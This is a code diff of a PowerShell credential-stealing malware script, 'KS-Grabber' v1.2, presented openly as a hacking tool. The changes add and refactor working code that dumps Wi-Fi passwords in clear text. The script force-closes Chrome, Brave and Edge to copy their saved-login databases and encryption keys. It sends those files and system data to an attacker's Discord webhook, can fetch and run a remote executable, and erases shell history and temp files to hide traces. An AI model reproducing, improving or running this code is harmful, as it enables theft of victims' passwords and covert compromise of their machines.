@@ -1,6 +1,6 @@
 <# Visual #>
 $Host.UI.RawUI.WindowTitle = "✨ KS-Grabber"
-
+$softwareVer = "1.2"
 Write-Output "
 ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⠀⠀⠀⠀⣠⣴⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⢾⡇⠀⢀⣀⣀⣀⡀⢉⡽⠁⠀⠀⣿⣦⠤⠤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -12,7 +12,7 @@ Write-Output "
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣦⠈⣿⣼⣿⣿⣿⡾⠆⠀⠙⣿⣿⠇⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \_____\\____\\\____\\____\\_____\_\____\/
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢯⠀⢻⣿⣿⣿⣿⣶⣶⣷⣾⣿⣣⣴⣾⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   Dedsec has given you the truth. Do what you will.
 ⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠖⢿⡆⠸⣏⢳⡼⣿⣿⣿⣿⣿⣟⠉⠙⠛⠋⣭⣷⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀   
-⠀⠀⠀⠀⠀⠀⠀⣴⠏⠀⢰⣿⣷⡄⣿⣾⣟⠬⣿⣿⣿⣿⣿⠀⢀⠀⣠⠟⠁⠀⠲⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀   Ks-Grabber V1.2
+⠀⠀⠀⠀⠀⠀⠀⣴⠏⠀⢰⣿⣷⡄⣿⣾⣟⠬⣿⣿⣿⣿⣿⠀⢀⠀⣠⠟⠁⠀⠲⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀   Ks-Grabber V$softwareVer
 ⠀⠀⠀⠀⠀⠀⣼⣿⠢⠬⣭⣿⣿⣧⢸⣿⣯⡑⠦⣾⣿⡟⣡⣔⣁⠴⢟⣱⠂⠀⠀⠈⢻⡀⠀⠀⠀⠀⠀⠀⠀   @im.nix
 ⠀⠀⠀⠀⣠⣾⠋⠀⣄⢀⣿⣿⢿⣷⠀⣿⢧⡙⢦⣙⣿⣿⣽⣿⣁⣹⠟⠛⢀⡇⠀⠀⠘⢧⠀⠀⠀⠀⠀⠀⠀ 
 ⠀⠀⠀⣰⠃⣏⣹⣦⣿⣿⡿⠁⠀⢿⣇⢘⡶⢬⣉⣿⣽⣿⣟⣻⣤⠆⣠⣺⣾⡇⡂⠀⢠⠘⡇⠀⠀⠀⠀⠀⠀
@@ -26,7 +26,6 @@ Write-Output "
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣾⣧⣸⣿⣿⣿⣧⠈⡿⣟⡠⢀⠄⣠⣿⣿⠟⢛⡉⠛⠀⡞⣼⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⡿⢸⣿⣏⣿⣿⣿⣿⣿⣽⡀⢹⠰⣚⣯⣾⣿⣿⡟⠉⠀⢀⡀⢠⢷⡇⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⡇⢸⣿⡿⣿⡿⣿⣿⣿⣿⣷⠈⣦⣿⡯⠀⡾⠋⠁⠰⣶⡟⢁⠎⣿⠁⠀⠀⠀⠀⠀⠀⠀"
-
 <# Features #>
 $features = @{
     "gatherPcData" = $true
@@ -43,35 +42,54 @@ foreach ($feature in $features.Keys) { if (-not (Test-Path "variable:$feature"))
 if ([string]::IsNullOrEmpty($keyContentLabel)) { $keyContentLabel = "Conteúdo da Chave|Key Content" }
 if ([string]::IsNullOrEmpty($hookUrl)) { Write-Output "You need to define a Discord webhook URL."; exit }
 if ($executeExe -and [string]::IsNullOrEmpty($exeUrl)) { Write-Output "You need to define a URL for your executable."; exit }
+$filesToSend = @()
 
 <# Functions #>
-function Send-File { ## TODO: Send all in one message (embed + files)
+function Send-Webhook {
     param (
-        [string]$filePath,
-        [string]$prefix
+        [string]$jsonBody,
+        [array]$files
     )
-    
-    if (Test-Path $filePath) {
-        $fileContent = [System.IO.File]::ReadAllBytes($filePath)
-        $fileName = [System.IO.Path]::GetFileName($filePath)
 
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $bodyLines = @(
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"file`"; filename=`"$prefix-$fileName`"",
-            "Content-Type: application/octet-stream",
-            "",
-            [System.Text.Encoding]::Default.GetString($fileContent),
-            "--$boundary--"
-        )
-        $body = [System.String]::Join("`r`n", $bodyLines)
+    $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
 
-        $headers = @{
-            "Content-Type" = "multipart/form-data; boundary=$boundary"
+    $bodyLines = @("--$boundary")
+
+    $bodyLines += @(
+        "Content-Disposition: form-data; name=`"payload_json`"",
+        "",
+        $jsonBody
+    )
+
+    if ($files.Count -gt 0) {
+        $index = 0
+        foreach ($file in $files) {
+            $filePath = $file.Path
+            $prefix = $file.Prefix
+            if (Test-Path $filePath) {
+                $fileContent = [System.IO.File]::ReadAllBytes($filePath)
+                $fileName = [System.IO.Path]::GetFileName($filePath)
+                $bodyLines += @(
+                    "--$boundary",
+                    "Content-Disposition: form-data; name=`"file[$index]`"; filename=`"$prefix-$fileName`"",
+                    "Content-Type: application/octet-stream",
+                    "",
+                    [System.Text.Encoding]::Default.GetString($fileContent)
+                )
+                $index++
+            }
         }
-
-        $null = Invoke-RestMethod -Uri $hookUrl -Method Post -Headers $headers -Body $body
     }
+
+    $bodyLines += "--$boundary--"
+
+    $body = [System.String]::Join("`r`n", $bodyLines)
+
+    $headers = @{
+        "Content-Type" = "multipart/form-data; boundary=$boundary"
+    }
+
+    $null = Invoke-RestMethod -Uri $hookUrl -Method Post -Headers $headers -Body $body
 }
 
 <# PC Dump #>
@@ -83,12 +101,12 @@ if ($gatherPcData) {
 <# Wifi Profiles Dump #>
 if ($gatherWifiProfiles) {
     Write-Output "[ + ] Gathering wifi profiles"
-    $WirelessSSIDs = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
-    $WifiInfo = foreach($SSID in $WirelessSSIDs) {
-        $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String $keyContentLabel) -replace ".*:\s+"
-        New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$Password}
+    $wirelessSSIDs = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
+    $wifiInfo = foreach($SSID in $wirelessSSIDs) {
+        $password = (netsh wlan show profiles name=$SSID key=clear | Select-String $keyContentLabel) -replace ".*:\s+"
+        New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$password}
     }
-    if ([string]::IsNullOrEmpty($WifiInfo)) { $WifiInfo= "ERROR: No wireless card detected" }
+    if ([string]::IsNullOrEmpty($wifiInfo)) { $wifiInfo= "ERROR: No wireless card detected" }
 }
 
 <# Open Ports Dump #>
@@ -116,6 +134,49 @@ if ($executeExe) {
     Start-Process -FilePath $tempFile
 }
 
+<# Browser Saved Passwords #>
+if ($gatherBrowserPass) {
+    Write-Output "[ + ] Gathering saved passwords"
+    $browserData = @(
+        @{
+            ProcessName = "chrome"
+            LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Local State"
+            Prefix = "Chrome"
+        },
+        @{
+            ProcessName = "brave"
+            LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
+            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"
+            Prefix = "Brave"
+        },
+        @{
+            ProcessName = "msedge"
+            LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
+            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Local State"
+            Prefix = "Edge"
+        }
+    )
+
+    foreach ($browser in $browserData) {
+        if(Get-Process -Name $browser.ProcessName -ErrorAction SilentlyContinue){
+            Stop-Process -Name $browser.ProcessName -Force -ErrorAction SilentlyContinue
+            Write-Output "[ ! ] Stopping $($browser.ProcessName)"
+        }
+        if ((Test-Path $browser.LoginDataPath) -and (Test-Path $browser.LocalStatePath)) {
+            Write-Output "[ + ] $($browser.Prefix)'s passwords gathered"
+            $filesToSend += @{
+                Path = $browser.LoginDataPath
+                Prefix = $browser.Prefix
+            }
+            $filesToSend += @{
+                Path = $browser.LocalStatePath
+                Prefix = $browser.Prefix
+            }
+        }
+    }
+}
+
 <# Json Body #>
 $json = @{
     embeds = @(
@@ -140,7 +201,7 @@ $json = @{
                 }
             )
             author = @{
-                name = "KS-Grabber V1.0"
+                name = "KS-Grabber V$softwareVer"
             }
             footer = @{
                 text = "Dedsec has given you the truth. Do what you will."
@@ -189,7 +250,7 @@ $json = @{
         }
         if ($gatherWifiProfiles) {
             @{
-                description = "``````$($WifiInfo | Out-String)``````"
+                description = "``````$($wifiInfo | Out-String)``````"
                 color = 0
                 author = @{
                     name = "Wifi Passwords"
@@ -220,49 +281,14 @@ $json = @{
     attachments = @()
 } | ConvertTo-Json -Depth 4
 
-<# Send Main Webhook #>
-Write-Output "[ + ] Sending base webhook"
-$null = Invoke-RestMethod -Uri $hookUrl -Method Post -ContentType "application/json" -Body $json
+<# Send Webhook #>
+Send-Webhook -jsonBody $json -files $filesToSend
 
-<# [WIP] Browser Saved Passwords #>
-if($gatherBrowserPass){
-    Write-Output "[ + ] Gathering saved passwords"
-    $browserData = @(
-        @{
-            ProcessName = "chrome"
-            LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data"
-            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Local State"
-            Prefix = "Chrome"
-        },
-        @{
-            ProcessName = "brave"
-            LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
-            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"
-            Prefix = "Brave"
-        },
-        @{
-            ProcessName = "msedge"
-            LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
-            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Local State"
-            Prefix = "Edge"
-        }
-    )
-
-    foreach ($browser in $browserData) {
-        try { Stop-Process -Name $browser.ProcessName -Force -ErrorAction SilentlyContinue; Write-Output "[ ! ] Stopping $($browser.ProcessName)..."} 
-        catch {}
-        if ((Test-Path $browser.LoginDataPath) -and (Test-Path $browser.LocalStatePath)) {
-            Write-Output "[ + ] $($browser.prefix)'s passwords gathered."
-            Send-File -filePath $browser.LoginDataPath -prefix $browser.Prefix
-            Send-File -filePath $browser.LocalStatePath -prefix $browser.Prefix
-        }
-    }
-}
-
-<# Remove Traces #>
+<# Remove traces #>
 if ($removeTraces) {
     Write-Output "[ - ] Removing traces"
     Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
 }
 
 Write-Output "✨ You have been pwned lmaooo :3 :3"
